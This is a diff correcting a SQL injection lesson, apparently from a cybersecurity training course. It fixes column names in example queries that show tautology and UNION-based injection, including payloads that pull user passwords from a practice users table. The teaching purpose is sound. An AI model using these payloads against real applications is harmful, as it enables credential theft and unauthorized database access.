@@ -8,7 +8,7 @@ In this activity, you designed several malicious SQL payloads that you will use 
 
     - For this query, place a `1` between the single quotes and select Run at the top left of the DB Fiddle page.
 
-      - `select first_name, last_name from users where id = '1'`
+      - `select first_name, last_name from users where user_id = '1'`
       
     - After running the query, the program will output the following:
           
@@ -40,7 +40,7 @@ In this activity, you designed several malicious SQL payloads that you will use 
 
     - The following will also cause the database to return all the values in the table:
 
-      - `select first_name, last_name from users where id = '1' OR 'dog' = 'dog' `
+      - `select first_name, last_name from users where user_id = '1' OR 'dog' = 'dog' `
       
     - The new query will return the same results as the previous query:
         
@@ -58,11 +58,11 @@ In this activity, you designed several malicious SQL payloads that you will use 
 
     - When adding an additional command with `UNION`, the count of fields requested (2 - first_name, password) needs to match the count of the original request (2 - first_name, last_name):
 
-      - `select first_name, last from users where id = '1' UNION select first_name, password from users where '1' = '1'`
+      - `select first_name, last_name from users where user_id = '1' UNION select first_name, password from users where '1' = '1'`
 
     - Note that `UNION` is basically running two queries together:
 
-      - `select first_name, last from users where id = '1'`  
+      - `select first_name, last_name from users where user_id = '1'`  
 
       - `select first_name, password from users where '1' = '1'`
       
@@ -85,7 +85,7 @@ In this activity, you designed several malicious SQL payloads that you will use 
 
     - Because the count of fields requested (3 - first_name, last_name, password) needs to match the count of the original request (2 - first_name, last_name), we need to combine two of the fields with the `CONCAT` command, using the following query:
 
-      - `select first_name, last_name from users where user_id = '1' UNION select CONCAT(first_name,last_name), password from users;
+      - `select first_name, last_name from users where user_id = '1' UNION select CONCAT(first_name,last_name), password from users;`
                `
             
     - The query will return the following:
